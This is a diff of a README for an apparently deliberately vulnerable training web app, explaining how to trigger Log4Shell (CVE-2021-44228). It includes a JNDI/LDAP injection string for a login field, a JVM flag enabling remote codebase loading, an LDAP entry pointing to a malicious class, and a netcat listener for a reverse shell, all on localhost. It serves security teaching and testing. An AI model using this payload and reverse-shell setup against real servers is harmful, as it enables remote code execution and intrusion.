@@ -12,27 +12,32 @@ An application with various vulnerabilities for testing
 
 ## CVE-2021-44228 (log4shell)
 
-Ensure the vulnerability works in versions of Java > 8 set the following property — JDK versions after JDKv8 disable class creation from URL codebases.
+To enable the in-memory LDAP server that is required for the JNDI lookup, you must run the application using the `ldap` spring profile e.g.:
 
+```bash
+java -Dspring.profiles.active=ldap -jar vulnerable-webapp-[latest].jar
 ```
--Dcom.sun.jndi.ldap.object.trustURLCodebase=true
-```
-Note, a codebase can be defined as a source, or a place, from which to load classes into a virtual machine. 
 
-If you want to debug the in-memory ldap server, you can enable unboundid debug logging using:
+Optionally, if you want to debug the in-memory LDAP server, you can enable `unboundid` debug logging using:
 
-```
+
+```bash
 -Dcom.unboundid.ldap.sdk.debug.enabled=true -Dcom.unboundid.ldap.sdk.debug.level=INFO -Dcom.unboundid.ldap.sdk.debug.type=ASN1 -Dcom.sun.jndi.ldap.object.trustURLCodebase=true
 ```
 
-Trigger the vulnerability by loading the LDAP entry using JNDI by supplying the following code injection into the *username* field of the `user-admin` page (other fields may work too!)
+### Triggering the vulnerability
+
+To trigger the vulnerability and force Log4j to load a Java Naming Reference LDAP entry (rfc2713) using JNDI, inject the following code into the *username* field of the `user-admin` page (other fields may work too!)
+
 
 ```
 ${jndi:ldap://127.0.0.1:8081/uid=java-ref,ou=people,dc=jisc,dc=ac,dc=uk}
 ```
 
+![JNDI log4shell injection](site/img/jndi-injection.jpg)
 
-The in-memory server has the following `javaNamingReference` object which will be looked up by the JNDI service invoked by the log4j substition code path:
+
+The in-memory server has the following `javaNamingReference` object which will be looked up by the JNDI service invoked by the log4j substitution code path:
 
 ```
 dn: uid=java-ref,ou=people,dc=jisc,dc=ac,dc=uk
@@ -50,7 +55,7 @@ uid: java-ref
 
 The URLClassLoader will lookup the `uk.ac.jisc.cybersec.rce.RceExploit` first from the local classpath (where it does not exist), then from the URL codebase provided by the LDAP entry. This triggers the download of the referenced `jar` file, and the instatiation of the `uk.ac.jisc.cybersec.rce.RceExploit` class. Triggering the static method in the malicious class:
 
-```
+```java
 package uk.ac.jisc.cybersec.rce;
 
 /**
@@ -75,3 +80,12 @@ public class RceReverseShellExploit {
 
 }
 ```
+
+To establish a remote network connection to the compromised web-server, you (as the *bad-actor*) must start a listener on port `8083`. For example, using `netcat`:
+
+
+```bash
+nc -l 8083
+```
+
+Currently, this is limited to listening on *localhost* or the IP *127.0.0.1* and port *8083* (see how the `RceReverseShellExploit` class is establishing a remote shell). 
